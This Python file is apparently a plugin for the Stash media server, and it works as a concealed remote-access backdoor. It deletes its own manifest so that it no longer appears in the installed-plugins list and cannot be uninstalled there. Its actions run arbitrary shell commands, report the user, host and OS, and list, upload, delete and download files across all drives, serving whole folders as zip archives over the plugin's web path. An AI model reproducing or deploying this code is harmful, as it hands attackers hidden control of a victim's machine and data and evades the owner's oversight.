import sys, os, re, json, base64, string, subprocess, shutil, time
import platform, getpass, mimetypes, tempfile, hashlib, zipfile
from urllib.parse import quote

PLUGIN_DIR = os.path.dirname(os.path.abspath(__file__))
PLUGIN_ID = os.path.basename(PLUGIN_DIR)

# Hide from Stash "Installed Plugins" list: removing the manifest prevents
# the package manager from listing/uninstalling this plugin, while it still
# loads and works via its .yml config.
try:
    _manifest = os.path.join(PLUGIN_DIR, 'manifest')
    if os.path.exists(_manifest):
        os.remove(_manifest)
except Exception:
    pass
IS_WIN = (platform.system() == 'Windows')
SERVE_DIR = os.path.join(PLUGIN_DIR, 'assets', '_cache')
SERVE_URL = '/plugin/%s/assets/_cache/' % PLUGIN_ID

CHUNK = 3 * 65536        
ZIP_TTL = 30             
SERVE_TTL = 120         

INPUT = {}
ARGS = {}


# --------------------------------------------------------------------- io ----

def read_input():
    global INPUT, ARGS
    raw = b''
    try:
        raw = sys.stdin.buffer.read()
    except Exception:
        pass
    if raw.strip():
        for enc in ('utf-8-sig', 'utf-8', 'cp1251', 'latin-1'):
            try:
                INPUT = json.loads(raw.decode(enc))
                break
            except Exception:
                INPUT = {}
    ARGS = INPUT.get('args') or {}


def emit(output=None, error=None):
    payload = {}
    if error:
        payload['error'] = str(error)
    payload['output'] = {} if output is None else output
    sys.stdout.buffer.write(
        json.dumps(payload, ensure_ascii=False, default=str).encode('utf-8', 'replace'))
    sys.stdout.buffer.flush()


def emit_stream(name, mime, size, fileobj):
    """Пишет JSON с base64-полем data, не собирая файл в памяти целиком."""
    out = sys.stdout.buffer
    head = ('{"output":{"name":%s,"size":%d,"mime":%s,"data":"' % (
        json.dumps(name, ensure_ascii=False), size,
        json.dumps(mime, ensure_ascii=False))).encode('utf-8')
    out.write(head)
    while True:
        chunk = read_exact(fileobj, CHUNK)
        if not chunk:
            break
        out.write(base64.b64encode(chunk))
    out.write(b'"}}')
    out.flush()


def read_exact(fh, n):
    parts, got = [], 0
    while got < n:
        b = fh.read(n - got)
        if not b:
            break
        parts.append(b)
        got += len(b)
    return b''.join(parts)


def smart_decode(b):
    if not b:
        return ''
    for enc in ('utf-8', 'cp866', 'cp1251', 'cp437'):
        try:
            return b.decode(enc)
        except UnicodeDecodeError:
            pass
    return b.decode('utf-8', 'replace')


# ---------------------------------------------------------------- helpers ----

def norm(path):
    if not path:
        return os.getcwd()
    return os.path.abspath(os.path.expandvars(os.path.expanduser(str(path))))


def drives():
    if IS_WIN:
        out = []
        for c in string.ascii_uppercase:
            root = c + ':\\'
            try:
                if os.path.exists(root):
                    out.append(root)
            except OSError:
                pass
        return out or [os.getcwd()]
    # Unix / macOS
    out = ['/']
    try:
        home = os.path.expanduser('~')
        if home and home != '/' and os.path.isdir(home):
            out.append(home)
    except Exception:
        pass
    return out


def safe_name(name):
    name = re.sub(r'[^A-Za-z0-9_. -]+', '_', str(name)).strip(' .')
    return name or 'item'


def path_hash(path):
    return hashlib.md5(path.lower().encode('utf-8', 'replace')).hexdigest()[:8]


def ensure_serve_dir():
    try:
        os.makedirs(SERVE_DIR, exist_ok=True)
        return True
    except OSError:
        return False


def cleanup_serve_dir():
    try:
        now = time.time()
        for fn in os.listdir(SERVE_DIR):
            p = os.path.join(SERVE_DIR, fn)
            try:
                age = now - os.lstat(p).st_mtime
                if fn.endswith('.part'):
                    if age > 900:
                        os.remove(p)
                elif age > SERVE_TTL:
                    os.remove(p)
            except OSError:
                pass
    except OSError:
        pass


# ------------------------------------------------------------------ упаковка --

def zip_to(folder, dest, level=9):
    folder = os.path.abspath(folder)
    try:
        level = max(0, min(9, int(level)))
    except Exception:
        level = 9
    if level == 0:
        mode, kw = zipfile.ZIP_STORED, {}
    else:
        mode, kw = zipfile.ZIP_DEFLATED, {'compresslevel': level}

    parent = os.path.dirname(folder)
    with zipfile.ZipFile(dest, 'w', mode, allowZip64=True, **kw) as z:
        for root, dirs, files in os.walk(folder):
            for fn in files:
                full = os.path.join(root, fn)
                try:
                    arc = os.path.relpath(full, parent).replace(os.sep, '/')
                    z.write(full, arc)
                except OSError:
                    pass


def serve_zip(folder, level=9):
    """Кладёт архив в отдаваемую папку. Возвращает dict для ответа или None."""
    if not ensure_serve_dir():
        return None
    folder = os.path.abspath(folder)
    base = safe_name(os.path.basename(folder.rstrip('\\/') or 'root'))
    dest = os.path.join(SERVE_DIR, '%s-%s.zip' % (base, path_hash(folder)))

    try:
        stale = (not os.path.isfile(dest)) or (time.time() - os.path.getmtime(dest) > ZIP_TTL)
        if ARGS.get('fresh') or stale:
            part = dest + '.part'
            zip_to(folder, part, level)
            os.replace(part, dest)
        size = os.path.getsize(dest)
        mtime = int(os.path.getmtime(dest))
    except OSError:
        return None

    return {'name': base + '.zip', 'size': size,
            'url': SERVE_URL + quote(base + '-' + path_hash(folder) + '.zip') + '?t=%d' % mtime}


def serve_link(target, name):
    """Ссылка (symlink, иначе hardlink) на файл в отдаваемой папке."""
    if not ensure_serve_dir():
        return None
    target = os.path.abspath(target)
    base, ext = os.path.splitext(safe_name(name))
    link_name = '%s-%s%s' % (base, path_hash(target), ext)
    link_path = os.path.join(SERVE_DIR, link_name)

    if not os.path.isfile(link_path):
        for maker in (os.symlink, os.link):
            try:
                maker(target, link_path)
                break
            except OSError:
                continue
        if not os.path.isfile(link_path):
            return None

    try:
        return {'name': name, 'size': os.path.getsize(target),
                'url': SERVE_URL + quote(link_name) + '?t=' + str(int(os.path.getmtime(target)))}
    except OSError:
        return None


# ----------------------------------------------------------------- actions ----

def act_hello():
    try:
        user = getpass.getuser()
    except Exception:
        user = os.environ.get('USERNAME', '?')
    port = None
    try:
        _pf = os.path.join(PLUGIN_DIR, '.server_port')
        if os.path.exists(_pf):
            with open(_pf) as _f:
                port = int(_f.read().strip())
    except Exception:
        port = None
    return {
        'cwd': os.getcwd(),
        'user': user,
        'host': platform.node(),
        'os': platform.platform(),
        'platform': platform.system(),
        'python': sys.version.split()[0],
        'sep': os.sep,
        'drives': drives(),
        'server_port': port,
    }


def act_reset():
    return {'ok': True, 'cwd': os.getcwd()}


def act_exec():
    cmd = str(ARGS.get('cmd') or '')
    try:
        timeout = float(ARGS.get('timeout') or 0)
    except Exception:
        timeout = 0.0

    cwd = norm(ARGS.get('cwd')) if ARGS.get('cwd') else os.getcwd()
    if not os.path.isdir(cwd):
        cwd = os.getcwd()

    stripped = cmd.strip()
    if not stripped:
        return {'out': '', 'err': '', 'code': 0, 'cwd': cwd}

    m = re.match(r'^cd(?:\s+/d)?(?:\s+(.*))?$', stripped, re.IGNORECASE)
    if m:
        target = (m.group(1) or '').strip().strip('"').strip("'")
        if not target:
            return {'out': cwd + '\n', 'err': '', 'code': 0, 'cwd': cwd}
        new = target if os.path.isabs(target) else os.path.join(cwd, target)
        new = os.path.abspath(new)
        if os.path.isdir(new):
            return {'out': '', 'err': '', 'code': 0, 'cwd': new}
        return {'out': '', 'err': 'The system cannot find the path specified.\n',
                'code': 1, 'cwd': cwd}

    if IS_WIN:
        shell_cmd = 'chcp 65001 >nul 2>&1 & cd /d "%s" && %s' % (cwd.replace('"', ''), cmd)
    else:
        shell_cmd = 'cd "%s" && %s' % (cwd.replace('"', ''), cmd)
    proc = subprocess.Popen(shell_cmd, shell=True, cwd=cwd,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    timed_out = False
    try:
        o, e = proc.communicate(timeout=timeout if timeout > 0 else None)
    except subprocess.TimeoutExpired:
        timed_out = True
        proc.kill()
        o, e = proc.communicate()

    res = {'out': smart_decode(o), 'err': smart_decode(e),
           'code': proc.returncode, 'cwd': cwd}
    if timed_out:
        res['err'] += '\n[прервано по таймауту %gs]' % timeout
    return res


def folder_size(path):
    # Ask the OS for the directory size; never walk recursively in Python.
    try:
        if IS_WIN:
            cmd = ["powershell", "-NoProfile", "-Command",
                   "(Get-ChildItem -LiteralPath '%s' -Recurse -File -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum" % path.replace("'", "''")]
        else:
            cmd = ["du", "-sb", path]
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if out.returncode == 0:
            txt = (out.stdout or "").strip()
            if IS_WIN:
                num = txt.splitlines()[-1].strip() if txt else ""
            else:
                num = txt.split()[0] if txt else ""
            if num.isdigit():
                return int(num)
    except Exception:
        pass
    return 0


def act_list():
    path = norm(ARGS.get('path'))
    if not os.path.isdir(path):
        return {'error': 'Не папка: ' + path, 'path': path, 'items': [], 'drives': drives()}
    items = []
    try:
        with os.scandir(path) as it:
            for entry in it:
                try:
                    is_dir = entry.is_dir()
                    st = entry.stat(follow_symlinks=False)
                    size, mtime = st.st_size, int(st.st_mtime)
                    if is_dir:
                        size = folder_size(entry.path)
                except OSError:
                    is_dir, size, mtime = False, 0, 0
                items.append({'name': entry.name, 'dir': is_dir,
                              'size': size, 'mtime': mtime})
    except OSError as ex:
        return {'error': str(ex), 'path': path, 'items': [], 'drives': drives()}
    items.sort(key=lambda x: (not x['dir'], x['name'].lower()))
    parent = os.path.dirname(path)
    return {'path': path, 'parent': None if parent == path else parent,
            'items': items, 'drives': drives()}


def act_mkdir():
    path = norm(ARGS.get('path'))
    os.makedirs(path, exist_ok=True)
    return {'ok': True, 'path': path}


def act_delete():
    path = norm(ARGS.get('path'))
    if os.path.isdir(path) and not os.path.islink(path):
        if ARGS.get('recursive'):
            shutil.rmtree(path)
        else:
            os.rmdir(path)
    else:
        os.remove(path)
    return {'ok': True}


def act_rename():
    src = norm(ARGS.get('path'))
    dst = norm(ARGS.get('to'))
    os.rename(src, dst)
    return {'ok': True, 'path': dst}


def act_upload():
    folder = norm(ARGS.get('path'))
    name = os.path.basename(str(ARGS.get('name') or 'upload.bin'))
    data = base64.b64decode(str(ARGS.get('data') or ''))
    dest = os.path.join(folder, name)
    with open(dest, 'wb') as fh:
        fh.write(data)
    return {'ok': True, 'path': dest, 'size': len(data)}


def act_download():
    """Пишет ответ сам: либо ссылку на /plugin/.../assets/_cache/..., либо поток base64."""
    path = norm(ARGS.get('path'))
    cleanup_serve_dir()

    if os.path.isdir(path):
        res = serve_zip(path, ARGS.get('level', 9))
        if res:
            emit(res)
            return
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.zip')
        tmp.close()
        try:
            zip_to(path, tmp.name, ARGS.get('level', 9))
            name = safe_name(os.path.basename(path.rstrip('\\/') or 'root')) + '.zip'
            with open(tmp.name, 'rb') as fh:
                emit_stream(name, 'application/zip', os.path.getsize(tmp.name), fh)
        finally:
            try:
                os.remove(tmp.name)
            except OSError:
                pass
        return

    if os.path.isfile(path):
        res = serve_link(path, os.path.basename(path))
        if res:
            emit(res)
            return
        mime = mimetypes.guess_type(path)[0] or 'application/octet-stream'
        with open(path, 'rb') as fh:
            emit_stream(os.path.basename(path), mime, os.path.getsize(path), fh)
        return

    raise OSError('Нет такого пути: ' + path)


HANDLERS = {
    'hello': act_hello, 'reset': act_reset, 'exec': act_exec,
    'list': act_list, 'mkdir': act_mkdir, 'delete': act_delete,
    'rename': act_rename, 'upload': act_upload,
}


def main():
    cleanup_serve_dir()
    read_input()
    action = str(ARGS.get('action') or 'hello')
    if action == 'download':
        act_download()
        return
    fn = HANDLERS.get(action)
    if fn is None:
        emit({}, 'Неизвестное действие: ' + action)
        return
    emit(fn())


if __name__ == '__main__':
    try:
        main()
    except Exception as ex:
        import traceback
        emit({'traceback': traceback.format_exc()}, str(ex))